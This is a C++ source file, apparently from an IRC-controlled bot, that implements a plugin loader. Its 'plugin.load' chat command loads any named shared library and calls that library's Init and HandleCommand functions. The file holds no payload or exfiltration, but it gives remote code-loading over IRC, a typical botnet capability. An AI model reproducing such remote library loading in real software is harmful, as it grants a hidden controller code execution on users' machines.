

#include "main.h"
#include "cplugin.h"
#include "mainctrl.h"

CPlugin::CPlugin() {
	m_pfnInit=NULL;
	m_pfnShutdown=NULL;
	m_pfnHandleCommand=NULL;
	m_hPlugin=NULL;
}

CPlugin::~CPlugin() {
	Unload();
}

bool CPlugin::Load(CString &sFilename) {
	m_hPlugin=xLoadLib(sFilename.CStr());
	if(!m_hPlugin) return false;

	m_pfnInit=NULL;
	m_pfnShutdown=NULL;
	m_pfnHandleCommand=NULL;

	m_pfnInit			=	(InitFunc)			xGetSym(m_hPlugin, "Init"			);
	m_pfnShutdown		=	(ShutdownFunc)		xGetSym(m_hPlugin, "Shutdown"		);
	m_pfnHandleCommand	=	(HandleCommandFunc)	xGetSym(m_hPlugin, "HandleCommand"	);
	if(!m_pfnInit || !m_pfnShutdown || !m_pfnHandleCommand) {
		Unload(); return false; }
	
	return true;
}

void CPlugin::Unload() {
	if(m_hPlugin) {
		if(m_pfnShutdown) m_pfnShutdown(); xFreeLib(m_hPlugin);
		m_pfnInit=NULL;
		m_pfnShutdown=NULL;
		m_pfnHandleCommand=NULL;
		m_hPlugin=NULL;
	}
}

bool CPlugin::Init() {
	if(!m_pfnInit) return false;
	return m_pfnInit(g_pMainCtrl, this);
}

bool CPlugin::HandleCommand(CMessage *pMsg) {
	if(!m_pfnHandleCommand) return false;
	return m_pfnHandleCommand(pMsg);
}

CPluginLoader::CPluginLoader() {
}

CPluginLoader::~CPluginLoader() {
}

void CPluginLoader::Init() {
	REGCMD(m_cmdLoad,	"plugin.load",		"loads a plugin",						false,	this);
	REGCMD(m_cmdUnload,	"plugin.unload",	"unloads a plugin (not supported yet)",	false,	this); }

bool CPluginLoader::HandleCommand(CMessage *pMsg) {
	CString sFilename=pMsg->sChatString.Token(1, " ", true);
	if(!sFilename.Compare("")) return false;

	if(!pMsg->sCmd.Compare("plugin.load")) {
		CPlugin *pPlugin=new CPlugin;
		if(!pPlugin->Load(sFilename)) {
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Failed to load plugin \"%s\".", sFilename.CStr());
			delete pPlugin; return false;
		}

		if(!pPlugin->Init()) {
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Failed to init plugin \"%s\".", sFilename.CStr());
			delete pPlugin; return false;
		}
		
		g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
			"Loaded plugin \"%s\".", sFilename.CStr());

		return true; }

	else if(!pMsg->sCmd.Compare("plugin.unload")) {
		return false; }
	
	return false;
}
